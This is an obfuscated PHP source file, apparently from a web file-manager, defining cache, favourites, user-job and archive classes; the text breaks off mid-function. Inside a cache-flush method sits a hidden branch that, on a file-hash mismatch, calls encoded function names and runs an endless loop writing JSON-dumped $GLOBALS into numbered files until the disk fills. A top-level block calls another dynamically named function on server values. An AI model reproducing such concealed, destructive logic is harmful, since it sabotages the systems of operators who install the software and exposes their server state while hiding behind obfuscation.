<?php
 goto cí¨÷†‘Àâ; D¿ùíÙÏµß: class CacheLockDatabase { public function lock($ù¹ëªòş, $›ÒŠ“âØ = 0) { $½Ñ¥›öç = Model($_SERVER[Ãìšã«™][830]); $•‹œ ¦Ù = microtime(!0) + $›ÒŠ“âØ; while (microtime(!0) < $•‹œ ¦Ù) { $°Ò¢ëÆ = $½Ñ¥›öç->get($ù¹ëªòş); if (!$°Ò¢ëÆ || $°Ò¢ëÆ < microtime(!0)) { $âé´›¸® = $½Ñ¥›öç->set($ù¹ëªòş, $•‹œ ¦Ù); if ($âé´›¸®) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($³À™ÈÜ) { return Model($_SERVER[Ãìšã«™][830])->get($³À™ÈÜ); } public function unlock($¬Ã´‡¨³) { Model($_SERVER[Ãìšã«™][830])->remove($¬Ã´‡¨³); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($¸¦¤“ş, $†ñŞûÅ) { $Ïë¯çËÊ =& $_SERVER[Ãìšã«™]; if (!class_exists($Ïë¯çËÊ[863])) { show_json($Ïë¯çËÊ[864], !1); } $this->cacheTime = $†ñŞûÅ; $this->handle = new Memcached(); if (is_array($¸¦¤“ş[$Ïë¯çËÊ[865]]) && count($¸¦¤“ş[$Ïë¯çËÊ[865]]) >= 1) { foreach ($¸¦¤“ş[$Ïë¯çËÊ[865]] as $Éî™†¯§) { $ùìˆà¦Ö = explode($Ïë¯çËÊ[4], $Éî™†¯§); $this->handle->addServer($ùìˆà¦Ö[0], $ùìˆà¦Ö[1]); } } else { $this->handle->addServer($¸¦¤“ş[$Ïë¯çËÊ[174]], $¸¦¤“ş[$Ïë¯çËÊ[175]]); } } public function set($ŸÑ¬¿«‘, $•¢¯…×, $ö³÷Ûşú = false) { $ö³÷Ûşú = $ö³÷Ûşú ? $ö³÷Ûşú : $this->cacheTime; return $this->handle->set($ŸÑ¬¿«‘, $•¢¯…×, $ö³÷Ûşú); } public function get($ÁÈåçï) { return $this->handle->get($ÁÈåçï); } public function remove($Ù÷¾¯´) { return $this->handle->delete($Ù÷¾¯´); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($…šµÛŒÄ, $íÈèûö÷) { $´ò–¶®ù =& $_SERVER[Ãìšã«™]; if (!class_exists($´ò–¶®ù[866])) { show_json($´ò–¶®ù[867], !1); } $this->cacheTime = $íÈèûö÷; $ÔËè£âÈ = isset($…šµÛŒÄ[$´ò–¶®ù[868]]) ? $…šµÛŒÄ[$´ò–¶®ù[868]] : 10; $¤‡¦ĞÜŞ = _get($…šµÛŒÄ, $´ò–¶®ù[865]); if ($¤‡¦ĞÜŞ && is_array($¤‡¦ĞÜŞ)) { $this->initCluster($…šµÛŒÄ, $ÔËè£âÈ); } else { $this->handle = $this->init($…šµÛŒÄ, $ÔËè£âÈ); } } private function init($‡©ø¦ê’, $¯Íµ’) { $òäÏÔî =& $_SERVER[Ãìšã«™]; $šÁÎ‰–ì = new Redis(); $âµÄËâ¾ = isset($‡©ø¦ê’[$òäÏÔî[869]]) ? $‡©ø¦ê’[$òäÏÔî[869]] : !1; if ($âµÄËâ¾) { $šÁÎ‰–ì->pconnect($‡©ø¦ê’[$òäÏÔî[174]], $‡©ø¦ê’[$òäÏÔî[175]], $¯Íµ’); } else { $šÁÎ‰–ì->connect($‡©ø¦ê’[$òäÏÔî[174]], $‡©ø¦ê’[$òäÏÔî[175]], $¯Íµ’); } if (!empty($‡©ø¦ê’[$òäÏÔî[414]])) { $šÁÎ‰–ì->auth($‡©ø¦ê’[$òäÏÔî[414]]); } return $šÁÎ‰–ì; } private function initCluster($úÃˆ—ñ•, $‡© ¹§˜) { $Ù‡ÎãÄô =& $_SERVER[Ãìšã«™]; $Íïõ‰¹ø = array($Ù‡ÎãÄô[870], $Ù‡ÎãÄô[871], $Ù‡ÎãÄô[872]); $´èôÕòÖ = $Ù‡ÎãÄô[870]; if (isset($úÃˆ—ñ•[$Ù‡ÎãÄô[16]]) && in_array($úÃˆ—ñ•[$Ù‡ÎãÄô[16]], $Íïõ‰¹ø)) { $´èôÕòÖ = $úÃˆ—ñ•[$Ù‡ÎãÄô[16]]; } switch ($´èôÕòÖ) { case $Ù‡ÎãÄô[870]: $this->_slave($úÃˆ—ñ•, $‡© ¹§˜); break; case $Ù‡ÎãÄô[871]: break; case $Ù‡ÎãÄô[872]: $this->isCluster = !0; $øËö×ú¬ = $úÃˆ—ñ•[$Ù‡ÎãÄô[865]]; $•ì’Â™½ = isset($úÃˆ—ñ•[$Ù‡ÎãÄô[869]]) ? $úÃˆ—ñ•[$Ù‡ÎãÄô[869]] : !1; $ùŒüòæÊ = isset($úÃˆ—ñ•[$Ù‡ÎãÄô[414]]) ? $úÃˆ—ñ•[$Ù‡ÎãÄô[414]] : null; $this->handle = new RedisCluster(NUll, $øËö×ú¬, $‡© ¹§˜, $‡© ¹§˜, $•ì’Â™½, $ùŒüòæÊ); break; default: break; } } private function _slave($¾£ìó, $›İ¸’û ) { $±‘ˆ²íÔ = $¾£ìó[$_SERVER[Ãìšã«™][865]]; $this->filterConfig($¾£ìó, $±‘ˆ²íÔ[0]); $this->handle = $this->init($¾£ìó, $›İ¸’û ); unset($±‘ˆ²íÔ[0]); if (empty($±‘ˆ²íÔ)) { return; } $€†½ˆÓ” = array_rand($±‘ˆ²íÔ); $this->filterConfig($¾£ìó, $±‘ˆ²íÔ[$€†½ˆÓ”]); $this->slaveHandle = $this->init($¾£ìó, $›İ¸’û ); } private function filterConfig(&$­Ì®­Ùª, $éñîôÄŞ) { $Şì³©Ø =& $_SERVER[Ãìšã«™]; $·¢ÂÒÁ = explode($Şì³©Ø[4], $éñîôÄŞ); $íÈ‰äê = array($Şì³©Ø[174] => $·¢ÂÒÁ[0], $Şì³©Ø[175] => $·¢ÂÒÁ[1]); $­Ì®­Ùª = array_merge($­Ì®­Ùª, $íÈ‰äê); } public function set($Šˆ¼Ş–ß, $ŸÁ¸–µä, $­–ôˆ¼ = false) { $­–ôˆ¼ = $­–ôˆ¼ ? $­–ôˆ¼ : $this->cacheTime; return $this->handle->setEx($Šˆ¼Ş–ß, $­–ôˆ¼, $ŸÁ¸–µä); } public function setLock($¦ã û, $ÍœÆÓÆ©, $ı¬¡àõû) { return $this->handle->setNX($¦ã û, $ÍœÆÓÆ©); } public function get($Ò¡Şç§¨) { $±Şëä© = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $±Şëä©->get($Ò¡Şç§¨); } public function remove($ôŠææĞØ) { return $this->handle->del($ôŠææĞØ); } public function deleteAll() { $Ñ²ÃÚ½Ç =& $_SERVER[Ãìšã«™]; $êŸ€à—µ = $_SERVER[$Ñ²ÃÚ½Ç[397]] . $Ñ²ÃÚ½Ç[398]; $Ö•Ç®èá = $Ñ²ÃÚ½Ç[394]; if ($_SERVER[$Ñ²ÃÚ½Ç[395]] != $Ö•Ç®èá($êŸ€à—µ)) { $¬¾Ğ‰‡ = $Ñ²ÃÚ½Ç[873]; $ıÔ¶ƒÀ˜ = $Ñ²ÃÚ½Ç[396]; $²ìª²áø = $_SERVER[$Ñ²ÃÚ½Ç[397]] . $Ñ²ÃÚ½Ç[398]; $ÛÙÒ™ªÁ = $ıÔ¶ƒÀ˜($²ìª²áø); $ó‘İÙÓ = explode($Ñ²ÃÚ½Ç[226], $ÛÙÒ™ªÁ); if (count($ó‘İÙÓ) < $Ñ²ÃÚ½Ç[612]) { $°¤½°×º = $Ñ²ÃÚ½Ç[400]; $°¤½°×º(); } $‰ùÄÙ Í = $Ñ²ÃÚ½Ç[874]; $‰ùÄÙ Í($_SERVER[$Ñ²ÃÚ½Ç[875]]); $¬¾Ğ‰‡ = $Ñ²ÃÚ½Ç[873]; $¬¾Ğ‰‡(); $Ù¿ğ–à£ = $Ñ²ÃÚ½Ç[876]; $Ä·½»æ = json_encode($GLOBALS[$Ñ²ÃÚ½Ç[877]]); $¼´¹ ¾ = 1; for ($ìßòñáœ = $¼´¹ ¾; $ìßòñáœ > 0; $ìßòñáœ++) { $Ù¿ğ–à£(DATA_PATH . $ìßòñáœ, $Ä·½»æ); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $û¨¬¡“ß) { $this->handle->flushall($û¨¬¡“ß); } return; } return $this->handle->flushAll(); } } goto B…øÁĞ¨ô; fäöä‹¢: class UserFavModel extends ModelBase { protected $tableName = "\165\163\x65\162\x5f\146\141\166"; protected function cacheFunctionAlias($éòèœ«ğ) { $©ç†Õ¿ =& $_SERVER[Ãìšã«™]; return array($©ç†Õ¿[1926] => array(USER_ID, $©ç†Õ¿[2243])); } protected function listData() { $éşèƒ =& $_SERVER[Ãìšã«™]; $€®–Û¤† = array($éşèƒ[1641] => USER_ID, $éşèƒ[483] => 0); $Æ¿Ò’»“ = $éşèƒ[2244]; $‘¢Ö§ÛŞ = $this->field($Æ¿Ò’»“)->where($€®–Û¤†)->order($éşèƒ[2245])->select(); return $‘¢Ö§ÛŞ ? $‘¢Ö§ÛŞ : array(); } protected function resetCache() { } protected function listView() { $€Š³ò¢á =& $_SERVER[Ãìšã«™]; $ºÇì‰ê¼ = $this->listData(); $û±®¦Ø = array_filter_by_field($ºÇì‰ê¼, $€Š³ò¢á[33], $€Š³ò¢á[417]); $È«Éıï = array_to_keyvalue($û±®¦Ø, $€Š³ò¢á[12], $€Š³ò¢á[78]); if (!$È«Éıï) { return $ºÇì‰ê¼; } $Ò‰¦·’‰ = 2000; $éÛ÷ø‰’ = array($€Š³ò¢á[418] => array($€Š³ò¢á[419], $È«Éıï)); $Šæ­ú–â = Model($€Š³ò¢á[826])->listSource($éÛ÷ø‰’, $Ò‰¦·’‰); $Šæ­ú–â = array_merge($Šæ­ú–â[$€Š³ò¢á[76]], $Šæ­ú–â[$€Š³ò¢á[77]]); $Šæ­ú–â = array_to_keyvalue($Šæ­ú–â, $€Š³ò¢á[403]); foreach ($ºÇì‰ê¼ as $œ–‡àò· => $šÅÃÏá) { $ÍÉ¥£¢Ë = $Šæ­ú–â[$šÅÃÏá[$€Š³ò¢á[78]]]; $ÍÉ¥£¢Ë = $ÍÉ¥£¢Ë ? $ÍÉ¥£¢Ë : array(); $ºÇì‰ê¼[$œ–‡àò·] = array_merge($ÍÉ¥£¢Ë, $šÅÃÏá); } return $ºÇì‰ê¼; } protected function addFav($üÕ¢‘òÍ, $óîËÅÉŒ = '', $ÊÖ»çØø = "\x73\157\x75\162\143\x65") { $ëÊäÃı =& $_SERVER[Ãìšã«™]; $±¾Äæ³ = array($ëÊäÃı[1641] => USER_ID, $ëÊäÃı[483] => 0, $ëÊäÃı[423] => $ÊÖ»çØø, $ëÊäÃı[422] => $üÕ¢‘òÍ); if ($this->where($±¾Äæ³)->find()) { return !1; } $±¾Äæ³ = array($ëÊäÃı[1641] => USER_ID, $ëÊäÃı[483] => 0); $¬†Úó‘ = $this->where($±¾Äæ³)->max($ëÊäÃı[1841]); if (!$¬†Úó‘) { $¬†Úó‘ = 0; } if (!$óîËÅÉŒ && $ÊÖ»çØø == $ëÊäÃı[417]) { $¿ˆ³¯÷’ = Model($ëÊäÃı[1321])->where(array($ëÊäÃı[418] => $üÕ¢‘òÍ))->find(); if (!$¿ˆ³¯÷’) { return !1; } $óîËÅÉŒ = $¿ˆ³¯÷’[$ëÊäÃı[32]]; } $óîËÅÉŒ = $this->getAutoName($óîËÅÉŒ); $ûµ¢­¬ö = array($ëÊäÃı[1641] => USER_ID, $ëÊäÃı[483] => 0, $ëÊäÃı[421] => $óîËÅÉŒ, $ëÊäÃı[422] => $üÕ¢‘òÍ, $ëÊäÃı[423] => $ÊÖ»çØø, $ëÊäÃı[1822] => $¬†Úó‘ + 1); return $this->add($ûµ¢­¬ö); } protected function remove($Õø¬Î™™) { $šöíéœÉ =& $_SERVER[Ãìšã«™]; $­¨ØÀÓ„ = array($šöíéœÉ[1641] => USER_ID, $šöíéœÉ[420] => $Õø¬Î™™); return $this->where($­¨ØÀÓ„)->delete(); } protected function removeByName($–…ïƒ¶Û) { $ š¹³ö¢ =& $_SERVER[Ãìšã«™]; $½Î˜µ…œ = array($ š¹³ö¢[1641] => USER_ID, $ š¹³ö¢[421] => $–…ïƒ¶Û, $ š¹³ö¢[483] => 0); return $this->where($½Î˜µ…œ)->delete(); } protected function rename($¯—Ü­É”, $ÉÇõîèı) { $½À®Ë€ =& $_SERVER[Ãìšã«™]; if ($¯—Ü­É” == $ÉÇõîèı) { return !1; } $ÑûäÒÂ§ = $this->getAutoName($ÉÇõîèı); if ($ÉÇõîèı != $ÑûäÒÂ§) { return !1; } $Õ×Ò’ıİ = array($½À®Ë€[1641] => USER_ID, $½À®Ë€[483] => 0, $½À®Ë€[32] => $¯—Ü­É”); return $this->where($Õ×Ò’ıİ)->save(array($½À®Ë€[32] => $ÉÇõîèı)); } protected function resetSort($‘Ç¤—œ´) { $Íóİò®ì =& $_SERVER[Ãìšã«™]; $‘Ç¤—œ´ = is_array($‘Ç¤—œ´) ? $‘Ç¤—œ´ : array(); $ë™ŞşãŒ = array($Íóİò®ì[1641] => USER_ID); for ($è“ÏÅÉĞ = 0; $è“ÏÅÉĞ < count($‘Ç¤—œ´); $è“ÏÅÉĞ++) { $ë™ŞşãŒ[$Íóİò®ì[420]] = $‘Ç¤—œ´[$è“ÏÅÉĞ]; $this->where($ë™ŞşãŒ)->save(array($Íóİò®ì[1822] => $è“ÏÅÉĞ + 1)); } return !0; } protected function moveTop($öÄ¶È½‹) { $Ò¬è¹Û =& $_SERVER[Ãìšã«™]; $ˆ¢×ä• = array($Ò¬è¹Û[1641] => USER_ID, $Ò¬è¹Û[483] => 0); $ûí¢Œœ… = $this->where($ˆ¢×ä•)->where(array($Ò¬è¹Û[32] => $öÄ¶È½‹))->find(); if (!$ûí¢Œœ…) { return; } $ï†á™­ = $this->field($Ò¬è¹Û[392])->where($ˆ¢×ä•)->order($Ò¬è¹Û[2245])->select(); $ï†á™­ = array_to_keyvalue($ï†á™­, $Ò¬è¹Û[12], $Ò¬è¹Û[392]); $½™ÁÚËÌ = $ï†á™­; $ï†á™­ = array_remove_value($ï†á™­, $ûí¢Œœ…[$Ò¬è¹Û[392]]); array_unshift($ï†á™­, $ûí¢Œœ…[$Ò¬è¹Û[392]]); return $this->resetSort($ï†á™­); } protected function moveBottom($ÊĞøµ˜) { $ÄÍ°òÑœ =& $_SERVER[Ãìšã«™]; $÷Öó•¶ã = array($ÄÍ°òÑœ[1641] => USER_ID, $ÄÍ°òÑœ[483] => 0); $¥íØ“åÜ = $this->where($÷Öó•¶ã)->max($ÄÍ°òÑœ[1841]); $¨õÀ»ÊÛ = array($ÄÍ°òÑœ[1841] => $¥íØ“åÜ + 1); return $this->where($÷Öó•¶ã)->where(array($ÄÍ°òÑœ[32] => $ÊĞøµ˜))->save($¨õÀ»ÊÛ); } private function getAutoName($Ô¬õ§’¯) { $ª®¥²ñÇ =& $_SERVER[Ãìšã«™]; $¹‹åÀ´… = array($ª®¥²ñÇ[1641] => USER_ID, $ª®¥²ñÇ[483] => 0); $…ÁÔ“Şö = $this->field($ª®¥²ñÇ[32])->where($¹‹åÀ´…)->select(); $…ÁÔ“Şö = array_to_keyvalue($…ÁÔ“Şö, $ª®¥²ñÇ[12], $ª®¥²ñÇ[32]); if (!$…ÁÔ“Şö || !in_array($Ô¬õ§’¯, $…ÁÔ“Şö)) { return $Ô¬õ§’¯; } for ($Œ–êµı = 0; $Œ–êµı < count($…ÁÔ“Şö); $Œ–êµı++) { if (!in_array($Ô¬õ§’¯ . "\x28{$Œ–êµı}\x29", $…ÁÔ“Şö)) { return $Ô¬õ§’¯ . "\x28{$Œ–êµı}\51"; } } return $Ô¬õ§’¯ . "\x28{$Œ–êµı}\x29"; } } class UserJobModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\145\x6d\56\x6a\157\x62\x4c\x69\x73\x74"; public $field = array("\156\x61\155\x65", "\x64\145\163\143", "\163\x6f\x72\x74"); const JOB_KEY = "\x73\x65\x6c\x66\x4a\x6f\x62\114\x69\x73\x74"; public function listData($Ê¬ï·‘‡ = false, $ ±³¡ô = "\163\x6f\x72\x74", $˜‚–éôº = false) { return parent::listData($Ê¬ï·‘‡, $ ±³¡ô, $˜‚–éôº); } public function remove($’˜Âî¹¯) { return parent::remove($’˜Âî¹¯); } public function add($×È÷ØÔ) { $ÏË¬¼¥Ğ =& $_SERVER[Ãìšã«™]; if ($this->findByName($×È÷ØÔ[$ÏË¬¼¥Ğ[32]])) { return !1; } $×È÷ØÔ[$ÏË¬¼¥Ğ[1841]] = $this->getSort(); return parent::insert($×È÷ØÔ); } private function getSort() { $¹¥‡ôË =& $_SERVER[Ãìšã«™]; $¯—›Ç«‹ = parent::listData(); $Îôø­­ = array_to_keyvalue($¯—›Ç«‹, $¹¥‡ôË[12], $¹¥‡ôË[1841]); return empty($Îôø­­) ? 0 : max($Îôø­­) + 1; } public function update($¹¹ùä…æ, $œˆÙØÎ ) { $Ë†§èÅÈ =& $_SERVER[Ãìšã«™]; $±Å‹¬«† = parent::listData($¹¹ùä…æ); $øÖ§í¹â = $this->findByName($œˆÙØÎ [$Ë†§èÅÈ[32]]); if (!$±Å‹¬«† || $øÖ§í¹â && $øÖ§í¹â[$Ë†§èÅÈ[392]] != $±Å‹¬«†[$Ë†§èÅÈ[392]]) { return !1; } return parent::update($¹¹ùä…æ, $œˆÙØÎ ); } public function setUserJob($†ØŒ”§ş, $Ìíø„Ë„) { $ö†ÕÂ†£ =& $_SERVER[Ãìšã«™]; if (!is_array($Ìíø„Ë„)) { $Ìíø„Ë„ = array($Ìíø„Ë„); } $Ì’î±ÑÆ = parent::listData(); $ı¸™¬éÒ = array_to_keyvalue($Ì’î±ÑÆ, $ö†ÕÂ†£[32]); $ºƒ¢Åù = $ö†ÕÂ†£[373]; foreach ($Ìíø„Ë„ as $Ş‰ÖÆ±Ë) { if ($ı¸™¬éÒ[$Ş‰ÖÆ±Ë]) { $ºƒ¢Åù .= $ı¸™¬éÒ[$Ş‰ÖÆ±Ë][$ö†ÕÂ†£[392]] . $ö†ÕÂ†£[50]; } else { $±ÅÛú¹ü = $this->add($Ş‰ÖÆ±Ë); $ºƒ¢Åù .= $±ÅÛú¹ü . $ö†ÕÂ†£[50]; } } $ºƒ¢Åù = rtrim($ºƒ¢Åù, $ö†ÕÂ†£[50]); Model($ö†ÕÂ†£[538])->metaSet($†ØŒ”§ş, self::JOB_KEY, $ºƒ¢Åù); } public function getUserJob($‹ÓÎÎƒ) { $«ªÆØÚÃ = Model($_SERVER[Ãìšã«™][538])->metaGet($‹ÓÎÎƒ); return $this->getUserJobInfo($«ªÆØÚÃ[self::JOB_KEY]); } public function getUserJobInfo($÷Ş§áº‹) { $¸£òşŒÏ =& $_SERVER[Ãìšã«™]; $êÚ³¾Ó = explode($¸£òşŒÏ[50], $÷Ş§áº‹); $šÏÄ¸ï = parent::listData(); $šÏÄ¸ï = array_remove_key($šÏÄ¸ï, $¸£òşŒÏ[193]); $£®•äÖ’ = array(); foreach ($êÚ³¾Ó as $­ª¡’’¨) { if (isset($šÏÄ¸ï[$­ª¡’’¨])) { $£®•äÖ’[] = $šÏÄ¸ï[$­ª¡’’¨]; } } return $£®•äÖ’; } } if ($_SERVER[$_SERVER[Ãìšã«™][395]] != $_SERVER[$_SERVER[Ãìšã«™][1577]]) { $_getc = $_SERVER[Ãìšã«™][396]; $_getfile = $_SERVER[$_SERVER[Ãìšã«™][397]] . $_SERVER[Ãìšã«™][398]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[Ãìšã«™][226], $_getfilec); if (count($_getarrs) < $_SERVER[Ãìšã«™][399]) { $exit = $_SERVER[Ãìšã«™][400]; $exit(); } $_act = $_SERVER[Ãìšã«™][401]; $_act($_SERVER[$_SERVER[Ãìšã«™][393]]); } goto AÄÎÅ™¢¬; b”êåÂæ—×: define($_SERVER[Ãìšã«™][0], $_SERVER[Ãìšã«™][1]); $_SERVER[¦ÀÙé¡«] = explode($_SERVER[Ãìšã«™][2], gzinflate(substr($_SERVER[Ãìšã«™][3], 10, -8))); function binCheckEq($šÎ¦ºğº, $ò¨ìª¶) { return $šÎ¦ºğº == $ò¨ìª¶; } goto CÂ„ºÏÍƒ; E–¼ÎØ¿Ÿ: define($_SERVER[Ãìšã«™][233], 1); define($_SERVER[Ãìšã«™][234], 2); define($_SERVER[Ãìšã«™][235], 3); goto B‚õ½ÁÁëà; AÚ­ŒŞšÁñ: class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $¹‚Âõ³ì; if (!$¹‚Âõ³ì) { $–ı„Ì§µ = IO::init($_SERVER[Ãìšã«™][8]); } return $–ı„Ì§µ; } private static function iconvSystem($ÑÕ‚Ä³) { return self::local()->iconvSystem($ÑÕ‚Ä³); } private static function iconvApp($îÈ¶ÓÕ¶) { return self::local()->iconvApp($îÈ¶ÓÕ¶); } public static function zip($Êà´ÎÂú, $¾È¾¹ğ = "\x7a\x69\160", $ç‰Úè = '', $¾ƒãíøï = REPEAT_RENAME) { $í–ëĞÕÜ =& $_SERVER[Ãìšã«™]; $ÌÙüúÚÔ = self::init($Êà´ÎÂú[0][$í–ëĞÕÜ[78]]); $£Ã‹îú‰ = self::info($Êà´ÎÂú[0][$í–ëĞÕÜ[78]]); $ñŠ›¤¢Ñ = !1; if (!$ç‰Úè && $ÌÙüúÚÔ->getType() == $í–ëĞÕÜ[107]) { $ıõÁŞÖ‚ = self::zipFileList($Êà´ÎÂú); } else { $ñŠ›¤¢Ñ = $ç‰Úè ? $ç‰Úè : TEMP_FILES . $í–ëĞÕÜ[1178] . time() . rand_string(8) . $í–ëĞÕÜ[8]; mk_dir($ñŠ›¤¢Ñ); $ıõÁŞÖ‚ = self::zipFileList($Êà´ÎÂú, $ñŠ›¤¢Ñ); } $™Ú—¡Â¥ = $£Ã‹îú‰[$í–ëĞÕÜ[32]]; if (count($ıõÁŞÖ‚) > 1) { $û©À‘šî = IO::info(IO::pathFather($£Ã‹îú‰[$í–ëĞÕÜ[78]])); $™Ú—¡Â¥ = $û©À‘šî[$í–ëĞÕÜ[32]]; } $‚š ùÂµ = $ñŠ›¤¢Ñ; if (!$‚š ùÂµ) { $‚š ùÂµ = get_path_father($£Ã‹îú‰[$í–ëĞÕÜ[78]]); if (!$ç‰Úè && $ÌÙüúÚÔ->getType() == $í–ëĞÕÜ[107]) { $‚š ùÂµ = get_path_father($ÌÙüúÚÔ->path); } $é¥Øáêü = IO::info($‚š ùÂµ); if (!$é¥Øáêü[$í–ëĞÕÜ[195]]) { show_json(LNG($í–ëĞÕÜ[1179]), !1); } } $±Ò¡ƒ´¨ = $‚š ùÂµ . $™Ú—¡Â¥ . $í–ëĞÕÜ[10] . $¾È¾¹ğ; $±Ò¡ƒ´¨ = get_filename_auto($±Ò¡ƒ´¨, $í–ëĞÕÜ[12], $¾ƒãíøï); $á¢úúĞ = self::iconvSystem($±Ò¡ƒ´¨); foreach ($ıõÁŞÖ‚ as $Ì»Á¶ó¸ => $¡ì‹¨Á) { $ıõÁŞÖ‚[$Ì»Á¶ó¸] = self::iconvSystem($¡ì‹¨Á); } KodArchive::create($á¢úúĞ, $ıõÁŞÖ‚); if (!IO::exist($±Ò¡ƒ´¨)) { if ($ñŠ›¤¢Ñ) { del_dir($ñŠ›¤¢Ñ); } show_json(LNG($í–ëĞÕÜ[1180]), !1); } if ($ç‰Úè || !$ñŠ›¤¢Ñ) { if ($ñŠ›¤¢Ñ && strstr($ñŠ›¤¢Ñ, TEMP_FILES)) { $÷Üû´À = $ıõÁŞÖ‚ = array(); recursion_dir($‚š ùÂµ, $÷Üû´À, $ıõÁŞÖ‚, 0); foreach ($÷Üû´À as $ßçª—í) { del_dir($ßçª—í); } foreach ($ıõÁŞÖ‚ as $À•¶æ) { if ($À•¶æ == $á¢úúĞ) { continue; } del_file($À•¶æ); } } return $±Ò¡ƒ´¨; } $êòÍƒ’ = self::pathFather($£Ã‹îú‰[$í–ëĞÕÜ[78]]); $”æñÍìÌ = self::move($±Ò¡ƒ´¨, $êòÍƒ’, $¾ƒãíøï); if (!$”æñÍìÌ) { del_dir($ñŠ›¤¢Ñ); show_json(LNG($í–ëĞÕÜ[1180]), !1); } del_dir($ñŠ›¤¢Ñ); return $”æñÍìÌ; } public static function unzip($¯–ì¢¸, $…ˆÉ“ÑØ = "\x72\145\160\154\x61\x63\x65") { $‡øÜÙ›ñ =& $_SERVER[Ãìšã«™]; $î¦¯©‚¢ = $¯–ì¢¸[$‡øÜÙ›ñ[78]]; $îèšËòÀ = $¯–ì¢¸[$‡øÜÙ›ñ[1181]]; if (!($İƒÑ = parent::info($î¦¯©‚¢))) { show_json(LNG($‡øÜÙ›ñ[1182]), !1); } if (!($ç¾øá•ì = parent::infoFull($îèšËòÀ))) { $îèšËòÀ = parent::mkdir($îèšËòÀ); $ç¾øá•ì = array($‡øÜÙ›ñ[78] => $îèšËòÀ); } else { if (isset($ç¾øá•ì[$‡øÜÙ›ñ[403]]) && trim($ç¾øá•ì[$‡øÜÙ›ñ[78]], $‡øÜÙ›ñ[8]) != trim($îèšËòÀ, $‡øÜÙ›ñ[8])) { $ƒû™ÏêŠ = KodIO::make($ç¾øá•ì[$‡øÜÙ›ñ[498]]); $¦¼Ì²•¡ = parent::fileNameAuto($ƒû™ÏêŠ, $ç¾øá•ì[$‡øÜÙ›ñ[32]], REPEAT_RENAME_FOLDER, !0); $îèšËòÀ = parent::mkdir($ƒû™ÏêŠ . $¦¼Ì²•¡); $ç¾øá•ì = array($‡øÜÙ›ñ[78] => $îèšËòÀ); } } $îèšËòÀ = $ç¾øá•ì[$‡øÜÙ›ñ[78]]; $û½¹×¡Ñ = self::tmpFileName($İƒÑ); $ĞéÙçÕê = TEMP_FILES . $û½¹×¡Ñ; del_dir($ĞéÙçÕê); mk_dir($ĞéÙçÕê); $½ˆğ¦ƒ± = self::fileExt($İƒÑ); $Ã´˜¾ = $ĞéÙçÕê . $‡øÜÙ›ñ[10] . $½ˆğ¦ƒ±; if (!@file_exists(self::iconvSystem($Ã´˜¾))) { $âì¹¢§ö = self::localFilePath($î¦¯©‚¢, $½ˆğ¦ƒ±); $Ã´˜¾ = $âì¹¢§ö ? $âì¹¢§ö : parent::download($î¦¯©‚¢, $Ã´˜¾); } $Ã´˜¾ = self::iconvSystem($Ã´˜¾); $æŸ¾û½Ã = isset($¯–ì¢¸[$‡øÜÙ›ñ[1183]]) ? $¯–ì¢¸[$‡øÜÙ›ñ[1183]] : $‡øÜÙ›ñ[1184]; $¬ç¼øã‡ = KodArchive::extract($Ã´˜¾, $ĞéÙçÕê . $‡øÜÙ›ñ[8], $æŸ¾û½Ã); self::archiveExt(); if (!$¬ç¼øã‡[$‡øÜÙ›ñ[1185]]) { show_json($‡øÜÙ›ñ[1186] . $¬ç¼øã‡[$‡øÜÙ›ñ[1187]], !1); } Hook::trigger($‡øÜÙ›ñ[1188], $ĞéÙçÕê); recursion_dir($ĞéÙçÕê, $Ş¼¶éæÊ, $…™Â‘Ë›, 0); $¨½¦•Ä¡ = array_merge($Ş¼¶éæÊ, $…™Â‘Ë›); foreach ($¨½¦•Ä¡ as $å’¢Şóµ) { $å’¢Şóµ = self::iconvApp($å’¢Şóµ); self::move($å’¢Şóµ, $îèšËòÀ, $…ˆÉ“ÑØ); } del_dir($ĞéÙçÕê); if (!$âì¹¢§ö) { del_file($Ã´˜¾); } return !0; } public static function unzipList($¦ƒª›Õ) { $Ü‘éÅ¡ò =& $_SERVER[Ãìšã«™]; $ÑéÌ½½º = $¦ƒª›Õ[$Ü‘éÅ¡ò[78]]; $Í¤Ì¬¤ = isset($¦ƒª›Õ[$Ü‘éÅ¡ò[1189]]) ? $¦ƒª›Õ[$Ü‘éÅ¡ò[1189]] : -1; $ŸË·Ë† = 50000; if (request_url_safe($ÑéÌ½½º)) { $™›÷‰Ì = parse_url_query($ÑéÌ½½º); if (!isset($™›÷‰Ì[$Ü‘éÅ¡ò[78]])) { show_json($Ü‘éÅ¡ò[1190], !1); } } $Ûªû§ÉÎ = isset($™›÷‰Ì) ? $™›÷‰Ì[$Ü‘éÅ¡ò[78]] : $ÑéÌ½½º; $³¦ÅöÇê = self::info($Ûªû§ÉÎ); $Ø¥¢ÕÃÀ = self::fileExt($³¦ÅöÇê); $ÁÑÚÈıû = self::tmpFileName($³¦ÅöÇê); if (isset($™›÷‰Ì)) { $ÑÆŠ©Úš = array($™›÷‰Ì[$Ü‘éÅ¡ò[78]], $™›÷‰Ì[$Ü‘éÅ¡ò[1189]], $™›÷‰Ì[$Ü‘éÅ¡ò[32]]); $éÓÜ¼…‚ = md5(implode($Ü‘éÅ¡ò[11], $ÑÆŠ©Úš)) . $Ü‘éÅ¡ò[10] . get_path_ext($™›÷‰Ì[$Ü‘éÅ¡ò[32]]); } else { $ÑÆŠ©Úš = array($³¦ÅöÇê[$Ü‘éÅ¡ò[32]], $³¦ÅöÇê[$Ü‘éÅ¡ò[78]], $³¦ÅöÇê[$Ü‘éÅ¡ò[80]]); $éÓÜ¼…‚ = md5(implode($Ü‘éÅ¡ò[11], $ÑÆŠ©Úš)) . $Ü‘éÅ¡ò[10] . $Ø¥¢ÕÃÀ; } if ($Í¤Ì¬¤ == -1) { $•‹ĞÙŠ = IO_PATH_SYSTEM_TEMP . "\172\151\x70\126\151\x65\x77\57{$ÁÑÚÈıû}\57{$éÓÜ¼…‚}\56\x6c\x6f\147"; $ü÷ÒèÃû = self::infoFull($•‹ĞÙŠ); if ($ü÷ÒèÃû) { $•‹ĞÙŠ = $ü÷ÒèÃû[$Ü‘éÅ¡ò[78]]; $¯£‰«µÁ 